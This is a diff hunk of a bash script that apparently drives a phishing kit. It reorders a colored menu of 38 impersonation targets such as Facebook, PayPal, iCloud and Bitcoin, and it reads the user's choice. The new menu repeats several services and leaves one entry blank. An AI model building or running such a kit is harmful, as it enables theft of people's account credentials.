@@ -35,25 +35,25 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 menu() {
 
-printf "          \e[1;101m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;0m Instagram\e[0m      \e[1;101m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;0m DropBox\e[0m        \e[1;101m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;0m eBay\e[0m            \n"                              
-printf "          \e[1;101m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;0m Facebook\e[0m       \e[1;101m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;0m Adobe ID   \e[0m    \e[1;101m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;0m Amazon\e[0m         \n"
-printf "          \e[1;101m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;0m Snapchat\e[0m       \e[1;101m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;0m Shopify   \e[0m     \e[1;101m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;0m iCloud\e[0m          \n"
-printf "          \e[1;101m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;0m Twitter\e[0m        \e[1;101m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;0m Messenger   \e[0m   \e[1;101m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;0m Spotify\e[0m          \n"                
-printf "          \e[1;101m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;0m Github\e[0m         \e[1;101m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;0m GitLab   \e[0m      \e[1;101m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;0m Netflix\e[0m          \n"                
-printf "          \e[1;101m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;0m Google\e[0m         \e[1;101m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;0m Twitch   \e[0m      \e[1;101m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;0m Custom\e[0m         \n"
-printf "          \e[1;101m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;0m Cyberary\e[0m       \e[1;101m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;0m MySpace    \e[0m             \n"
-printf "          \e[1;101m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;0m Yahoo\e[0m          \e[1;101m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;0m Badoo   \e[0m                \n"        
-printf "          \e[1;101m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;0m Linkedin\e[0m       \e[1;101m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;0m VK   \e[0m                   \n"         
-printf "          \e[1;101m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;0m Protonmail\e[0m     \e[1;101m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;0m Yandex   \e[0m               \n"
-printf "          \e[1;101m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;0m Wordpress\e[0m      \e[1;101m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;0m devianART   \e[0m            \n"
-printf "          \e[1;101m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;0m Microsoft\e[0m      \e[1;101m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;0m Wi-Fi   \e[0m                \n"
-printf "          \e[1;101m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;0m IGFollowers\e[0m    \e[1;101m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;0m PayPal  \e[0m                \n"
-printf "          \e[1;101m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;0m Pinterest\e[0m      \e[1;101m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;0m Steam  \e[0m                              \n"
-printf "          \e[1;101m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;0m Apple ID\e[0m       \e[1;101m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;0m Bitcoin  \e[0m                             \n"
-printf "          \e[1;101m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;0m Verizon\e[0m        \e[1;101m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;0m Playstation  \e[0m           \e[1;94m                  \n"
+printf "          \e[1;101m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;0m Facebook\e[0m      \e[1;101m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;0m PayPal\e[0m        \e[1;101m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;0m eBay\e[0m            \n"                              
+printf "          \e[1;101m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;0m Google\e[0m        \e[1;101m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;0m Github   \e[0m    \e[1;101m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;0m Amazon\e[0m         \n"
+printf "          \e[1;101m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;0m Twitter\e[0m       \e[1;101m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;0m Pinterest   \e[0m     \e[1;101m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;0m iCloud\e[0m          \n"
+printf "          \e[1;101m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;0m Instagram\e[0m     \e[1;101m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;0m Verizon   \e[0m   \e[1;101m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;0m Spotify\e[0m          \n"                
+printf "          \e[1;101m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;0m Snapchat\e[0m      \e[1;101m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;0m Steam   \e[0m      \e[1;101m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;0m Netflix\e[0m          \n"                
+printf "          \e[1;101m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;0m Yahoo\e[0m         \e[1;101m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;0m Twitch   \e[0m      \e[1;101m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;0m Custom\e[0m         \n"
+printf "          \e[1;101m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;0m Linkedin\e[0m      \e[1;101m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;0m Yandex    \e[0m             \n"
+printf "          \e[1;101m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;0m Microsoft\e[0m     \e[1;101m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;0m Badoo   \e[0m                \n"        
+printf "          \e[1;101m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;0m Apple-ID\e[0m      \e[1;101m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;0m Devian-Art   \e[0m                   \n"         
+printf "          \e[1;101m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;0m Protonmail\e[0m    \e[1;101m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;0m Ebay   \e[0m               \n"
+printf "          \e[1;101m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;0m WiFi\e[0m          \e[1;101m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;0m Amazon   \e[0m            \n"
+printf "          \e[1;101m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;0m Wordpress\e[0m     \e[1;101m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;0m iCloud   \e[0m                \n"
+printf "          \e[1;101m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;0m Badoo\e[0m         \e[1;101m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;0m Spotify  \e[0m                \n"
+printf "          \e[1;101m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;0m Shopify\e[0m       \e[1;101m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;0m Netflix  \e[0m                              \n"
+printf "          \e[1;101m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;0m Apple ID\e[0m      \e[1;101m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;0m Bitcoin  \e[0m                             \n"
+printf "          \e[1;101m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;0m \e[0m       \e[1;101m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;0m Playstation  \e[0m           \e[1;94m                  \n"
 
 
-read -p $'\n\e[1;0m[\e[0m\e[1;77m*\e[0m\e[1;77m] Choose an option: \e[93m\en' option
+read -p $'\n\e[1;0m[\e[0m\e[1;77m*\e[0m\e[1;77m] Choose an option: \e[93m\en' option 
 
 
 if [[ $option == 1 ]]; then
